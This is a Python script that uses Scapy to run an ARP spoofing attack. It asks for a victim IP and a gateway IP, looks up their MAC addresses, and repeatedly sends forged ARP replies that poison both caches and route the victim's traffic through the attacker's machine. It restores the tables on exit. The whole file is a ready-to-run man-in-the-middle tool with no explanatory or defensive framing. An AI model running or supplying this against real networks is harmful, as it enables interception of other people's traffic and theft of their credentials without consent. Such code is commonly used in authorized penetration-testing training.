from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, conf, get_if_list
import time

def get_mac(ip, iface):
   
    arp_req = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_req

    try:
        answered, _ = srp(packet, timeout=10,retry=3, iface=iface, verbose=False)
        for _, rcv in answered:
            return rcv.hwsrc
    except Exception as e:
        print(f"[!] Error getting MAC for {ip}: {e}")
    return None

def spoof(victim_ip, victim_mac, spoof_ip, iface):
    
    packet = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    sendp(packet, iface=iface, verbose=False)

def restore(dest_ip, dest_mac, src_ip, src_mac, iface):
    
    packet = Ether(dst=dest_mac) / ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                                       psrc=src_ip, hwsrc=src_mac)
    sendp(packet, count=4, iface=iface, verbose=False)

def choose_interface():

    print("\nAvailable interfaces:")
    interfaces = get_if_list()
    for idx, iface in enumerate(interfaces):
        print(f"{idx}: {iface}")
    choice = int(input("Choose interface index (usually your Wi-Fi): "))
    return interfaces[choice]

def main():
    #print("=== ARP Spoofer (Wi-Fi Compatible) ===")
    #iface = choose_interface()
    iface="Wi-Fi"
    conf.iface = "Wi-Fi"

    victim_ip = input("Enter victim IP address: ").strip()
    gateway_ip = input("Enter gateway IP address: ").strip()

    print(f"\n[+] Resolving MAC addresses.")
    victim_mac = get_mac(victim_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)

    if not victim_mac:
        print(f"[!] Could not find MAC for victim {victim_ip}. Exiting.")
        return
    if not gateway_mac:
        print(f"[!] Could not find MAC for gateway {gateway_ip}. Exiting.")
        return

    print(f"[+] Victim ({victim_ip}) MAC: {victim_mac}")
    print(f"[+] Gateway ({gateway_ip}) MAC: {gateway_mac}")
    print("[*] Starting ARP spoofing. Press CTRL+C to stop.")

    try:
        while True:
            spoof(victim_ip, victim_mac, gateway_ip, iface)
            spoof(gateway_ip, gateway_mac, victim_ip, iface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C. Restoring ARP tables.")
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        restore(gateway_ip, gateway_mac, victim_ip, victim_mac, iface)
        print("[+] ARP tables restored. Exiting.")

if __name__ == "__main__":
    main()
